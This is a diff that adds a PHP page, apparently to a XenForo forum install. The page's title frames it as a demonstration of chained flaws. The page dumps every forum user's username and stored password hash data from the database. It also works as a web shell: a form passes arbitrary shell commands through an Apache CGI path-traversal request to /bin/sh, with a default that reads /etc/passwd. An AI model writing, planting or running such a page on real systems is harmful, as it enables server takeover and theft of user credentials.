@@ -1,0 +1,81 @@
+<?php
+header('Content-Type: text/html');
+require('../../../src/config.php');
+
+?>
+<html>
+<head>
+  <title>PHP RCE -> Apache RCE, also DB password in plaintext, and poorly stored passwords</title>
+  <style type="text/css">
+    table, tr, td, th {
+      border: 1px solid black;
+    }
+  </style>
+</head>
+<body>
+<?php
+
+function _f($in) {
+  return htmlentities($in, ENT_QUOTES | ENT_HTML5);
+}
+
+$db = new PDO(
+  'mysql:dbname=' . $config['db']['dbname'] .
+  ';host=' . $config['db']['host'],
+  $config['db']['username'], $config['db']['password']);
+
+$passwordsQuery = $db->query('
+  select xf_user_authenticate.user_id, username, scheme_class, data from xf_user_authenticate
+  join xf_user on (xf_user_authenticate.user_id = xf_user.user_id);
+  ', PDO::FETCH_ASSOC);
+?>
+
+<table>
+  <tr>
+    <th>user_id</th>
+    <th>username</th>
+    <th>scheme_class</th>
+    <th>data</th>
+  </tr>
+<?php
+foreach($passwordsQuery as $row) {
+  echo
+  '<tr>' .
+    '<td>' . _f($row['user_id']) . '</td>' .
+    '<td>' . _f($row['username']) . '</td>' .
+    '<td>' . _f($row['scheme_class']) . '</td>' .
+    '<td>' . _f($row['data']) . '</td>';
+  '</tr>';
+}
+
+$rce = $_GET['rce'] ?? 'ls -alh /etc/passwd';
+
+?>
+</table>
+<hr />
+
+<form method="get">
+  RCE: <input type="text" size="140" name="rce" value="<?=_f($rce);?>" /><br />
+  <input type="submit" />
+</form>
+
+<?php
+
+
+$c = curl_init("http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh");
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_PATH_AS_IS, true);
+curl_setopt($c, CURLOPT_POSTFIELDS, 'echo;' . $rce);
+$r = curl_exec($c);
+
+?>
+<hr />
+<pre>
+<?php
+
+echo _f($r);
+
+?>
+</pre>
+</body>
